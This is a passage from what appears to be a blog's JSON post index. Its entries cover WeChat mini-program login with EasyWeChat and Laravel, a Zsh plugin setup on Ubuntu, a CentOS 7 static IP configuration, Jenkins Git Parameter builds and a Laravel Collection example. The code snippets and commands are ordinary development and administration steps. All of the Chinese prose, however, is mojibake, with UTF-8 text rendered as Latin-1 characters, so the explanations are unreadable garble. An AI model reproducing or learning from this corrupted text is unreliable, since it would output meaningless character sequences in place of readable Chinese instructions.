2021-05-12T13:09:23.000Z","updated":"2021-05-13T13:31:49.175Z","comments":true,"path":"summary-of-mini-program-development-experience/","link":"","permalink":"https://www.0x2beace.com/summary-of-mini-program-development-experience/","excerpt":"é€šå¸¸å¯¹æ¥å°ç¨‹åºï¼Œä¸ºäº†åŠ å¿«å¼€å‘é€Ÿåº¦ï¼Œä¼šç›´æ¥ä½¿ç”¨ EasyWeChat è¿™ä¸ªæ‰©å±•åŒ…è¿›è¡Œå¼€å‘ï¼ŒEasyWeChat å·²ç»å°è£…å¥½äº†å¾®ä¿¡ç›¸å…³çš„æ¥å£ï¼Œä½¿ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ã€‚","text":"é€šå¸¸å¯¹æ¥å°ç¨‹åºï¼Œä¸ºäº†åŠ å¿«å¼€å‘é€Ÿåº¦ï¼Œä¼šç›´æ¥ä½¿ç”¨ EasyWeChat è¿™ä¸ªæ‰©å±•åŒ…è¿›è¡Œå¼€å‘ï¼ŒEasyWeChat å·²ç»å°è£…å¥½äº†å¾®ä¿¡ç›¸å…³çš„æ¥å£ï¼Œä½¿ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ã€‚ å°ç¨‹åºç™»å½•æµç¨‹ä¸‹å›¾æ˜¯å¾®ä¿¡å®˜æ–¹æä¾›çš„æ—¶åºå›¾ï¼š æ•´ç†æˆæµç¨‹ï¼Œå¤§æ¦‚å°±æ˜¯ï¼š å°ç¨‹åºè°ƒç”¨ wx.login() æ¥å£è·å–ä¸´æ—¶ç™»å½•å‡­è¯ï¼ˆcodeï¼‰ï¼Œè¿™ä¸€æ­¥ç”¨æˆ·æ˜¯æ— æ„ŸçŸ¥çš„ï¼Œæ— éœ€ç”¨æˆ·æˆæƒï¼› å°ç¨‹åºæäº¤ code åˆ° å¼€å‘è€…æœåŠ¡å™¨ï¼› å¼€å‘è€…æœåŠ¡å™¨é€šè¿‡ appidã€appsecret å’Œ code è¯·æ±‚å¾®ä¿¡æ¥å£ï¼Œæ¢å–ç”¨æˆ·çš„ session_key å’Œ openidï¼› å¼€å‘è€…æœåŠ¡å™¨æ ¹æ® openid æŸ¥æ‰¾åˆ°å¯¹åº”çš„ç”¨æˆ·ï¼Œå­˜å…¥ session_keyï¼Œç„¶åä¸ºè¯¥ç”¨æˆ·ç”Ÿæˆ access_token ï¼ˆJWTï¼‰è¿”å›ç»™å°ç¨‹åºã€‚ æœ‰äº† access_token å°ç¨‹åºå°±å¯ä»¥è°ƒç”¨ä»»æ„æ¥å£äº†ã€‚ æ³¨æ„è¿™é‡Œçš„ session_key æ˜¯ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„è®¾è®¡ï¼Œæ˜¯ç”¨æˆ·çš„ ä¼šè¯å¯†é’¥ï¼Œéœ€è¦å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­ï¼Œè°ƒç”¨è·å–ç”¨æˆ·ä¿¡æ¯ã€è·å–å¾®ä¿¡ç”¨æˆ·ç»‘å®šçš„æ‰‹æœºå·ç­‰å¾®ä¿¡æ¥å£æ—¶ï¼Œéœ€è¦ç”¨è¿™ä¸ª ä¼šè¯å¯†é’¥ æ‰èƒ½è§£å¯†è·å–ç›¸å…³æ•°æ®ã€‚æ¯æ¬¡è°ƒç”¨ wx.login() ä¹‹åï¼Œå¾®ä¿¡éƒ½ä¼šè‡ªåŠ¨ç”Ÿæˆæ–°çš„ session_key ï¼Œå¯¼è‡´ä¹‹å‰çš„ session_key å¤±æ•ˆï¼Œæ‰€ä»¥åœ¨å¿…è¦çš„æ—¶å€™å†å»è°ƒç”¨ wx.login()ï¼Œè€Œä¸”è¿˜è¦åŠæ—¶ä¿å­˜ session_key åˆ°æœåŠ¡å™¨ï¼Œä»¥å¤‡åç»­ä½¿ç”¨ã€‚ æ­¤æ®µæµç¨‹æ•´ç†æ¥è‡ªLaravel ç¤¾åŒºçš„ã€ŠL04 Laravelæ•™ç¨‹-å¾®ä¿¡å°ç¨‹åºä»é›¶åˆ°å‘å¸ƒã€‹ã€‚ è·å–OpenIDå’ŒSessionKeyæ¸…æ¥šäº†å°ç¨‹åºçš„ç™»å½•æµç¨‹ä¹‹åï¼Œå¯ä»¥åŠ¨æ‰‹æ¥è·å–codeäº†ã€‚ åˆ›å»ºå°ç¨‹åºè¿™é‡Œå»ºè®®ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„å¾®ä¿¡å¼€å‘è€…å·¥å…·ï¼Œä»¥å…å‡ºç°ä¸€äº›ä¸å¿…è¦çš„é—®é¢˜ã€‚ å¡«å…¥AppIDï¼Œç‚¹å‡»æ–°å»ºã€‚ åˆå§‹åŒ–çš„å°ç¨‹åºæ— éœ€åšä»»ä½•æ›´æ”¹ï¼Œåªéœ€è¦åœ¨wx.login() ä¸‹é¢å¢åŠ ä¸€è¡Œconsole.log(res) å°†ç»“æœæ‰“å°åœ¨æ§åˆ¶å°ä¸­ï¼Œç„¶åé‡æ–°ç¼–è¯‘ï¼Œå³å¯çœ‹åˆ°æ§åˆ¶å°ä¸­è¾“å‡ºäº† codeã€‚ æ‹¿åˆ°code ä¹‹åï¼Œå°±å¯ä»¥è·å–OpenIDã€SessionKeyäº†ã€‚ ä»£ç è°ƒè¯•ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œè¿™é‡Œç›´æ¥åœ¨ Laravel çš„Tinker ä¸­è¿›è¡Œæµ‹è¯•ï¼Œä»¥ä¸‹ä»£ç é€è¡Œç²˜è´´åœ¨ tinker ä¸­ï¼š 1234567891011121314151617use EasyWeChat\\Factory;$config = [ 'app_id' =&gt; 'wx2b41f13e5e*****', 'secret' =&gt; '92474ce5be69c4fb25392d6cfb******', 'response_type' =&gt; 'array', 'log' =&gt; [ 'level' =&gt; 'debug', ],];$app = Factory::miniProgram($config);$app-&gt;auth-&gt;session('CODE');// æ­£å¸¸è¾“å‡ºå¦‚ä¸‹ï¼š[ \"session_key\" =&gt; \"nFpZ0gfHKOtYQ878enM*****\", \"openid\" =&gt; \"oN7jq1ejz5KQX5JtEiBsL*****\",] å…¶ä¸­app_id å’Œsecret éœ€è¦å¼€å‘è€…é€šè¿‡å¾®ä¿¡å¼€å‘å¹³å°è‡ªè¡Œè·å–ï¼š ä¸å¡«æˆ–è€…å¡«å…¥é”™è¯¯çš„app_id å’Œ secret éƒ½ä¼šå¯¼è‡´è·å–OpenIDå¼‚å¸¸ã€‚ å¦‚æœé‡åˆ°å¼‚å¸¸ï¼Œå¯ä»¥å¯¹ç…§å¾®ä¿¡å®˜æ–¹æ–‡æ¡£â€”â€”å…¨å±€è¿”å›ç è¿›è¡Œæ’æŸ¥åˆ†æã€‚ ç™»å½•å‡­è¯æ ¡éªŒæ‹¿åˆ°OpenIDåŠ SessionKey ä¹‹åï¼Œä¸‹ä¸€æ­¥å°±å¯ä»¥è¿›è¡Œè§£å¯†äº†ï¼Œè¿™ä¸€æ­¥ä¹Ÿæ˜¯é€šè¿‡EasyWeCaht æ¥å®Œæˆã€‚ æ ¹æ®å‰é¢çš„æ—¶åºå›¾ï¼Œå¯ä»¥å¾—çŸ¥ï¼Œç™»å½•å‡­è¯æ ¡éªŒéœ€è¦ç”¨åˆ°ä»¥ä¸‹å‚æ•°ï¼š appidï¼šiv appsecretï¼šencryptedData codeï¼šä¸Šé¢æ‹¿åˆ°çš„SessionKey æœ€åä¸€ä¸ªéƒ½å¥½ç†è§£ï¼Œå¯æ˜¯å‰é¢ä¸¤ä¸ªåˆ†åˆ«æ˜¯ä»€ä¹ˆé¬¼ï¼Ÿ ä¸ç€æ€¥ï¼Œå…ˆæ‰“å¼€å¾®ä¿¡å¼€å‘è€…å·¥å…·ï¼Œåœ¨app.js ä¸­ï¼ŒåŠ å…¥ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223// app.jsApp(&#123; onLaunch() &#123; // ... // è·å–ç”¨æˆ·ä¿¡æ¯ wx.getSetting(&#123; success: res =&gt; &#123; if (res.authSetting['scope.userInfo']) &#123; // å·²ç»æˆæƒï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ getUserInfo è·å–å¤´åƒæ˜µç§°ï¼Œä¸ä¼šå¼¹æ¡† wx.getUserInfo(&#123; success: res =&gt; &#123; console.log(res) &#125; &#125;) &#125; &#125; &#125;) &#125;, globalData: &#123; userInfo: null &#125;&#125;) ä¿å­˜ä¹‹åï¼Œå†æ¬¡ç¼–è¯‘ï¼ŒæŸ¥çœ‹æ§åˆ¶å°è¾“å‡ºï¼š è¿™ä¸¤ä¸ªå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„æ•°æ®äº†ï¼Œæ‹¿åˆ°ä¹‹åï¼Œå†æ¬¡æ‰“å¼€Tinkerï¼š 1$app-&gt;encryptor-&gt;decryptData(&quot;SessionKey&quot;, &quot;iv&quot;, &quot;encryptedData&quot;) æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿”å›ç»“æœä¼šåŒ…å«å½“å‰ç™»å½•ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯æµ‹è¯•å·ï¼Œå› æ­¤å¹¶æ²¡æœ‰è­¬å¦‚æ‰‹æœºå·è¿™ç±»å­—æ®µã€‚ è‡³æ­¤ï¼Œå°ç¨‹åºç™»å½•ä¸å¾®ä¿¡æ¥å£æœåŠ¡çš„äº¤äº’å°±å‘Šä¸€æ®µè½äº†ï¼Œè·å–åˆ°ç”¨æˆ·èº«ä»½ä¹‹åçš„é€»è¾‘å°±ä¸ç”¨å¤šè¯´äº†ã€‚ ä¸Šé¢å°ç¨‹åºç«¯çš„ä»£ç åªæ˜¯æ¼”ç¤ºå¦‚ä½•æ‹¿åˆ°éœ€è¦çš„å‚æ•°ï¼Œå®é™…å¼€å‘å¹¶ä¸å»ºè®®ç”¨æ­¤æ–¹å¼ç›´æ¥å†™åœ¨app.js ä¸­ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"å¦‚ä½•é…ç½®ä¸€ä¸ªç®€æ´é«˜æ•ˆçš„ Zsh","slug":"how-to-configure-a-simple-and-efficient-zsh","date":"2021-05-09T00:48:19.000Z","updated":"2021-05-09T00:48:56.131Z","comments":true,"path":"how-to-configure-a-simple-and-efficient-zsh/","link":"","permalink":"https://www.0x2beace.com/how-to-configure-a-simple-and-efficient-zsh/","excerpt":"Shell æ˜¯ç±» Unix ç³»ç»Ÿä¸­è¶…çº§å¥½ç”¨çš„å·¥å…·ï¼Œè€Œ Zsh æ˜¯ Shell ä¸­çš„ä½¼ä½¼è€…ï¼Œä½†æ˜¯ç°åœ¨ç½‘ä¸Šä¸€æœç´¢ Zsh çš„é…ç½®æ–¹æ¡ˆï¼Œéåœ°éƒ½æ˜¯çš„äº’ç›¸å¤åˆ¶ç²˜è´´çš„oh-my-zsh é…ç½®æ–¹æ¡ˆã€‚äº‹å®ä¸Š oh-my-zsh å¹¶ä¸å¥½ç”¨ï¼Œä¸¥é‡æ‹–æ…¢äº† Zsh çš„é€Ÿåº¦ï¼Œä¸‹é¢åˆ†äº«ä¸€ä¸ªç®€æ´é«˜æ•ˆçš„Zsh é…ç½®æ–¹æ¡ˆã€‚","text":"Shell æ˜¯ç±» Unix ç³»ç»Ÿä¸­è¶…çº§å¥½ç”¨çš„å·¥å…·ï¼Œè€Œ Zsh æ˜¯ Shell ä¸­çš„ä½¼ä½¼è€…ï¼Œä½†æ˜¯ç°åœ¨ç½‘ä¸Šä¸€æœç´¢ Zsh çš„é…ç½®æ–¹æ¡ˆï¼Œéåœ°éƒ½æ˜¯çš„äº’ç›¸å¤åˆ¶ç²˜è´´çš„oh-my-zsh é…ç½®æ–¹æ¡ˆã€‚äº‹å®ä¸Š oh-my-zsh å¹¶ä¸å¥½ç”¨ï¼Œä¸¥é‡æ‹–æ…¢äº† Zsh çš„é€Ÿåº¦ï¼Œä¸‹é¢åˆ†äº«ä¸€ä¸ªç®€æ´é«˜æ•ˆçš„Zsh é…ç½®æ–¹æ¡ˆã€‚ å®‰è£…Zshè¿™é‡Œç›´æ¥ä»å‘è¡Œç‰ˆçš„æºä¸­è¿›è¡Œå®‰è£…ï¼Œç®€å•ã€é«˜æ•ˆï¼š 12sudo apt-get updatesudo apt-get install zsh å®‰è£…æ’ä»¶åŠä¸»é¢˜ä¸¤ä¸ªæ’ä»¶ä¸€ä¸ªä¸»é¢˜ï¼š zsh-autosuggestionsï¼šè¿™ä¸ªæ˜¯è‡ªåŠ¨å»ºè®®æ’ä»¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨æç¤ºä½ éœ€è¦çš„å‘½ä»¤ã€‚ zsh-syntax-highlightingï¼šè¿™ä¸ªæ˜¯ä»£ç é«˜äº®æ’ä»¶ï¼Œèƒ½å¤Ÿä½¿ä½ çš„å‘½ä»¤è¡Œå„ä¸ªå‘½ä»¤æ¸…æ™°æ˜äº†ã€‚ zsh-theme-powerlevel10k è¿™ä¸ªä¸»é¢˜æä¾›æ¼‚äº®çš„æç¤ºç¬¦ï¼Œå¯ä»¥æ˜¾ç¤ºå½“å‰è·¯å¾„ã€æ—¶é—´ã€å‘½ä»¤æ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œè¿˜èƒ½å¤Ÿæ”¯æŒ git åˆ†æ”¯æ˜¾ç¤ºç­‰ç­‰ã€‚ ä¸€é”®å®‰è£…ï¼š 1sudo apt-get install zsh-autosuggestions zsh-syntax-highlighting zsh-theme-powerlevel9k ä¸å‡ºæ„å¤–çš„è¯ï¼Œä¼šæç¤ºï¼š 1E: Unable to locate package zsh-autosuggestions è¿™æ˜¯å› ä¸ºè½¯ä»¶æºä¸­å¹¶æ²¡æœ‰zsh-autosuggestions è¿™ä¸ªpackageï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨æ·»åŠ è½¯ä»¶åŒ…ã€‚ è¿™é‡Œå¯ä»¥ç›´æ¥è¿›å…¥opensuse è¿›è¡Œæœç´¢ï¼Œéœ€è¦çš„è½¯ä»¶åŒ…ã€‚ æ‰¾åˆ°å¯¹åº”çš„å‘è¡Œç‰ˆï¼Œç‚¹å‡»Export Downloadï¼š è¿™é‡Œæä¾›ä¸¤ç§æ–¹å¼ä¾›æˆ‘ä»¬é€‰æ‹©ï¼š æ·»åŠ è½¯ä»¶æºå¹¶æ‰‹åŠ¨å®‰è£… ç›´æ¥æŠ“å–äºŒè¿›åˆ¶è½¯ä»¶åŒ… ç›´æ¥ç»™ç»“è®ºï¼Œç¬¬äºŒç§æ–¹å¼æ›´ç®€å•äº›ï¼Œç›´æ¥ä¸‹è½½.debæ–‡ä»¶ä¹‹åï¼Œå°±å¯ä»¥å®‰è£…äº†ã€‚ é€‰æ‹©å¯¹åº”çš„æ“ä½œç³»ç»Ÿä»¥åŠç‰ˆæœ¬ï¼Œå³é”®æ‹·è´é“¾æ¥åœ°å€ï¼š 12$ wget https://download.opensuse.org/repositories/shells:/zsh-users:/zsh-autosuggestions/xUbuntu_18.04/amd64/zsh-autosuggestions_0.5.0+1.1_amd64.deb$ sudo dpkg -i zsh-autosuggestions_0.5.0+1.1_amd64.deb å†æ¬¡æ‰§è¡Œå‘½ä»¤ï¼š 1sudo apt-get install zsh-autosuggestions zsh-syntax-highlighting zsh-theme-powerlevel9k è‡³æ­¤ï¼Œæ’ä»¶å’Œä¸»é¢˜å°±å®‰è£…å®Œæˆäº†ã€‚ æ›´æ”¹é»˜è®¤Shell1$ chsh -s &#x2F;usr&#x2F;bin&#x2F;zsh æ³¨é”€å¹¶é‡æ–°ç™»å½•ï¼Œå†æ¬¡ç™»å½•æˆåŠŸæ—¶ï¼Œé»˜è®¤å¯ç”¨äº†zshã€‚ é…ç½®æ’ä»¶å’Œä¸»é¢˜ç¬¬ä¸€æ¬¡è¿›å…¥ Zsh ä¼šè‡ªåŠ¨å‡ºç°ä¸€ä¸ªé…ç½®ç•Œé¢ï¼Œè¿™ä¸ªç•Œé¢å¯ä»¥æ ¹æ®éœ€è¦è‡ªå®šä¹‰ Zshã€‚ é…ç½®ç•Œé¢ä¸­å„ä¸ªèœå•ä»£è¡¨çš„æ„æ€åˆ†åˆ«æ˜¯ï¼š 1ï¼šè®¾ç½®å‘½ä»¤å†å²è®°å½•ç›¸å…³çš„é€‰é¡¹2ï¼šè®¾ç½®å‘½ä»¤è¡¥å…¨ç³»ç»Ÿ3ï¼šè®¾ç½®çƒ­å»º4ï¼šé€‰æ‹©å„ç§å¸¸è§çš„é€‰é¡¹ï¼Œåªéœ€è¦é€‰æ‹©â€œOnâ€æˆ–è€…â€œOffâ€0ï¼šé€€å‡ºï¼Œå¹¶ä½¿ç”¨ç©ºç™½ï¼ˆé»˜è®¤ï¼‰é…ç½®aï¼šç»ˆæ­¢è®¾ç½®å¹¶é€€å‡ºqï¼šé€€å‡º å¯ç”¨æ’ä»¶å’Œä¸»é¢˜Zsh çš„é…ç½®æ–‡ä»¶æ˜¯ ~/.zshrc æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨ä½ çš„ç”¨æˆ·ç›®å½•ä¸‹ ~/ã€‚åˆ æ‰äº†è¿™ä¸ªæ–‡ä»¶ï¼Œå†æ¬¡è¿›å…¥ Zshæ—¶ï¼Œä¼šå†æ¬¡è¿›å…¥ Zsh çš„é…ç½®ç•Œé¢ã€‚ å°†ä»¥ä¸‹ä»£ç åŠ å…¥åˆ° ~/.zshrc æ–‡ä»¶ä¸­ï¼Œä»¥å¯ç”¨æ’ä»¶å’Œä¸»é¢˜ï¼š 123source &#x2F;usr&#x2F;share&#x2F;powerlevel9k&#x2F;powerlevel9k.zsh-themesource &#x2F;usr&#x2F;share&#x2F;zsh-autosuggestions&#x2F;zsh-autosuggestions.zshsource &#x2F;usr&#x2F;share&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zsh å†æ¬¡æ³¨é”€å¹¶ç™»å½•ï¼Œå³å¯çœ‹åˆ°æ–°çš„ç»ˆç«¯ç•Œé¢ï¼š åŸæ–‡åœ°å€ é…ç½®ä¸€ä¸ªç®€æ´é«˜æ•ˆçš„ Zsh","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Centos 7 è®¾ç½®é™æ€ IP","slug":"centos-7-set-static-ip","date":"2021-05-07T14:05:55.000Z","updated":"2021-05-07T14:06:55.620Z","comments":true,"path":"centos-7-set-static-ip/","link":"","permalink":"https://www.0x2beace.com/centos-7-set-static-ip/","excerpt":"é€šå¸¸æœ¬åœ°çš„è™šæ‹Ÿæœºï¼Œé»˜è®¤éƒ½æ˜¯åŠ¨æ€IPï¼Œè¿™å°±æ„å‘³ç€ï¼Œæ¯æ¬¡é‡å¯æœºå™¨ï¼ŒIP åœ°å€éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè™½ç„¶ä¸å½±å“æ­£å¸¸ä½¿ç”¨ï¼Œä½†æ˜¯æ¯æ¬¡é‡å¯éƒ½å‘ç”Ÿå˜åŒ–ï¼Œè¿™å°±å¯¼è‡´è¿˜éœ€è¦çœ‹ä¸€çœ¼ï¼Œæ‰çŸ¥é“å½“å‰æ–°çš„IP æ˜¯å¤šå°‘ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥æ°¸ä¹…è®¾ç½®æˆé™æ€IP å‘¢ï¼Œç­”æ¡ˆæ˜¯æœ‰çš„ã€‚","text":"é€šå¸¸æœ¬åœ°çš„è™šæ‹Ÿæœºï¼Œé»˜è®¤éƒ½æ˜¯åŠ¨æ€IPï¼Œè¿™å°±æ„å‘³ç€ï¼Œæ¯æ¬¡é‡å¯æœºå™¨ï¼ŒIP åœ°å€éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè™½ç„¶ä¸å½±å“æ­£å¸¸ä½¿ç”¨ï¼Œä½†æ˜¯æ¯æ¬¡é‡å¯éƒ½å‘ç”Ÿå˜åŒ–ï¼Œè¿™å°±å¯¼è‡´è¿˜éœ€è¦çœ‹ä¸€çœ¼ï¼Œæ‰çŸ¥é“å½“å‰æ–°çš„IP æ˜¯å¤šå°‘ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥æ°¸ä¹…è®¾ç½®æˆé™æ€IP å‘¢ï¼Œç­”æ¡ˆæ˜¯æœ‰çš„ã€‚ ç³»ç»Ÿç‰ˆæœ¬ï¼š 12$ cat &#x2F;etc&#x2F;redhat-release CentOS Linux release 7.8.2003 (Core) æŸ¥çœ‹å½“å‰ç½‘å¡çš„åç§°ï¼š ä¸€å°ç”µè„‘å¯èƒ½æœ‰å¤šä¸ªç½‘å¡ï¼Œå¦‚ä½•åˆ¤æ–­å“ªä¸€ä¸ªæ˜¯å½“å‰æ­£åœ¨ä½¿ç”¨çš„ï¼Ÿ å°±çœ‹å“ªä¸ªç½‘å¡çš„IP åˆšå¥½æ˜¯è¯¥æœºå™¨å½“å‰çš„IPã€‚ æ¯”å¦‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæœºå™¨å½“å‰çš„IP æ˜¯192.168.1.100ï¼Œé‚£ä¹ˆåªè¦ç¡®å®šæŸä¸ªç½‘å¡çš„IP ä¹Ÿæ˜¯ 192.168.1.100ï¼Œé‚£è¿™ä¸ªç½‘å¡å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„äº†ã€‚ ç¼–è¾‘å¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼š 12$ cd &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts$ vim ifcfg-ç½‘å¡åç§° è®¾ç½®é™æ€IP é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š 12345678910111213141516171819202122TYPE=\"Ethernet\"PROXY_METHOD=\"none\"BROWSER_ONLY=\"no\"BOOTPROTO=\"static\" # ä½¿ç”¨é™æ€IPåœ°å€ï¼Œé»˜è®¤ä¸ºåŠ¨æ€ï¼Œå³dhcpIPADDR=\"192.168.241.100\" # è®¾ç½®çš„é™æ€IPåœ°å€NETMASK=\"255.255.255.0\" # å­ç½‘æ©ç GATEWAY=\"192.168.1.1\" # ç½‘å…³åœ°å€DNS1=\"114.114.114.114\" # DNSæœåŠ¡å™¨DEFROUTE=\"yes\"IPV4_FAILURE_FATAL=\"no\"IPV6INIT=\"yes\"IPV6_AUTOCONF=\"yes\"IPV6_DEFROUTE=\"yes\"IPV6_FAILURE_FATAL=\"no\"IPV6_ADDR_GEN_MODE=\"stable-privacy\"NAME=\"ens33\"UUID=\"95b614cd-79b0-4755-b08d-99f1cca7271b\"DEVICE=\"ens33\"ONBOOT=\"yes\" #æ˜¯å¦å¼€æœºå¯ç”¨ é‡å¯ç½‘ç»œï¼š 1$ service network restart å¦‚æœæ²¡æœ‰ç”Ÿæ•ˆï¼Œå¯ä»¥å°è¯•ç¼–è¾‘/etc/resolv.confï¼ŒåŠ å…¥ä»¥ä¸‹é…ç½®ï¼š 1nameserver 114.114.114.114 # å’Œä¸Šé¢çš„DNS æœåŠ¡å™¨ä¿æŒä¸€è‡´ å†æ¬¡é‡å¯ç½‘ç»œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¿™ç§é…ç½®æ˜¯æ°¸ä¹…ç”Ÿæ•ˆçš„ï¼Œå³ä½¿ä¸‹æ¬¡é‡å¯ç”µè„‘ï¼ŒIP åœ°å€ä¹Ÿä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚ è‡³æ­¤ï¼Œå°±å®Œæˆäº†è®¾ç½®é™æ€IP çš„å…¨éƒ¨é…ç½®ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Centos","slug":"Centos","permalink":"https://www.0x2beace.com/tags/Centos/"}]},{"title":"å¦‚ä½•åˆ©ç”¨Jenkins å®ç°æ ‡ç­¾æˆ–è€…åˆ†æ”¯é€‰æ‹©æ€§æ„å»º","slug":"how-to-use-jenkins-to-implement-tag-or-branch-selective-construction","date":"2021-05-06T13:08:51.000Z","updated":"2021-05-06T13:10:02.763Z","comments":true,"path":"how-to-use-jenkins-to-implement-tag-or-branch-selective-construction/","link":"","permalink":"https://www.0x2beace.com/how-to-use-jenkins-to-implement-tag-or-branch-selective-construction/","excerpt":"å¦‚é¢˜ã€‚","text":"å¦‚é¢˜ã€‚ éœ€æ±‚å¯ä»¥ç®€å•æè¿°ä¸ºï¼šåœ¨Jenkins ä¸­é€šè¿‡æ‰‹åŠ¨çš„æ–¹å¼è‡ªä¸»é€‰æ‹©æ ‡ç­¾æˆ–è€…åˆ†æ”¯è¿›è¡Œæ„å»ºã€‚è€Œä¸æ˜¯é€šè¿‡ Push äº‹ä»¶è¿›è¡Œè‡ªåŠ¨è§¦å‘ã€‚ åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œéœ€è¦å…ˆå®‰è£… Git Parameter æ’ä»¶ã€‚ åœ¨å¯é€‰æ’ä»¶ä¸­æœç´¢Git Parameterï¼Œè¿›è¡Œå®‰è£…ã€‚ æ­£å¸¸å®‰è£…å®Œæˆï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼š åˆ›å»ºä¸€ä¸ªè‡ªç”±é£æ ¼çš„è½¯ä»¶é¡¹ç›®ï¼š é€‰æ‹©å‚æ•°åŒ–æ„å»ºè¿‡ç¨‹ï¼Œå‚æ•°ç±»å‹é€‰æ‹©åˆ†æ”¯æˆ–æ ‡ç­¾ï¼š æºç ç®¡ç†é€‰æ‹©Gitï¼Œå¡«ä¸Šé¡¹ç›®åœ°å€ï¼Œå¦‚æœæ˜¯ç§æœ‰é¡¹ç›®ï¼Œéœ€è¦æ·»åŠ  Credentialï¼š æœ€åç‚¹å‡»ä¿å­˜å³å¯ã€‚ ç‚¹å‡»Build with Parametersï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰æ ‡ç­¾å’Œåˆ†æ”¯ï¼Œæ‰‹åŠ¨é€‰æ‹©ä¸åŒçš„åˆ†æ”¯å’Œæ ‡ç­¾å³å¯è¿›è¡Œæ„å»ºã€‚ å¯ä»¥çœ‹åˆ°æ ¸å¿ƒçš„æ­¥éª¤å…¶å®åªæœ‰ä¸¤æ­¥ï¼Œå¦‚æœè¿˜æœ‰å…¶ä»–éœ€æ±‚ï¼Œæ¯”å¦‚æ„å»ºå®Œæˆä¹‹åï¼Œæ‰§è¡ŒæŸä¸ªè„šæœ¬ï¼Œä¹Ÿæ˜¯å¯ä»¥å®ç°çš„ï¼Œ å‚è€ƒé“¾æ¥ Jenkinsæ•™ç¨‹ï¼ˆä¸‰ï¼‰æ·»åŠ å‡­æ®ä¸æµæ°´çº¿æ‹‰å–Gitä»£ç  Jenkinså‚æ•°åŒ–æ„å»º-æ’ä»¶:Git Parameter Jenkins ä¸­ä½¿ç”¨ Git Parameter æ’ä»¶åŠ¨æ€è·å– Git çš„åˆ†æ”¯ Jenkinsï¼šä½¿ç”¨Git Parameteræ’ä»¶å®ç°tagæˆ–åˆ†æ”¯çš„é€‰æ‹©æ€§æ„å»º åˆ©ç”¨ jenkins è¾¾åˆ°æ tag è‡ªåŠ¨æ‰“åŒ… Jenkins å®ç°å‰ç«¯è‡ªåŠ¨æ‰“åŒ…,è‡ªåŠ¨éƒ¨ç½²ä»£ç åŠé‚®ä»¶æé†’åŠŸèƒ½","categories":[{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/categories/Jenkins/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/tags/Jenkins/"}]},{"title":"Laravel Collection å®é™…ä½¿ç”¨","slug":"the-actual-use-of-collection-in-laravel","date":"2021-05-04T00:32:36.000Z","updated":"2021-06-05T01:38:06.847Z","comments":true,"path":"the-actual-use-of-collection-in-laravel/","link":"","permalink":"https://www.0x2beace.com/the-actual-use-of-collection-in-laravel/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†Collection åœ¨Laravel çš„å®é™…åº”ç”¨åœºæ™¯ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†Collection åœ¨Laravel çš„å®é™…åº”ç”¨åœºæ™¯ã€‚ æ±‚å’Œ éœ€æ±‚ï¼šéå†$orders æ•°ç»„ï¼Œæ±‚price çš„å’Œã€‚ 12345678910111213141516&lt;?php// å¼•å…¥packagerequire __DIR__ . '/vendor/autoload.php';$orders = [[ 'id' =&gt; 1, 'user_id' =&gt; 1, 'number' =&gt; '13908080808', 'status' =&gt; 0, 'fee' =&gt; 10, 'discount' =&gt; 44, 'order_products'=&gt; [ ['order_id'=&gt;1,'product_id'=&gt;1,'param'=&gt;'6å¯¸','price'=&gt;555.00,'product'=&gt;['id'=&gt;1,'name'=&gt;'è›‹ç³•åç§°','images'=&gt;[]]], ['order_id'=&gt;1,'product_id'=&gt;1,'param'=&gt;'7å¯¸','price'=&gt;333.00,'product'=&gt;['id'=&gt;1,'name'=&gt;'è›‹ç³•åç§°','images'=&gt;[]]], ],]]; 